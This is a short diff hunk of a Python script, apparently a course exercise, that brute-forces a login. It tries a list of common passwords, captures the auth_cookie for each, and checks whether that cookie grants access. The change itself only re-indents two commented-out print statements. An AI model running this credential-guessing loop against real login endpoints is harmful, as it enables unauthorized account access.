@@ -10,10 +10,10 @@ list_of_passwords = ["123456", "123456789", "qwerty", "password", "1234567", "12
 for password in list_of_passwords:
     response1 = requests.post(url=url1, data={"login":login, "password":password})  # The first request to get auth_cookie
     cookie_value = response1.cookies.get('auth_cookie')
-   # print(cookie_value)
+    #print(cookie_value)
     cookies = {'auth_cookie': cookie_value}
     response2 = requests.post(url=url2, cookies=cookies)  # The second request to check auth_cookie
-   # print(response2.text)
+    #print(response2.text)
     answer = "You are NOT authorized"
     if answer in response2.text:
         print("Wrong password")
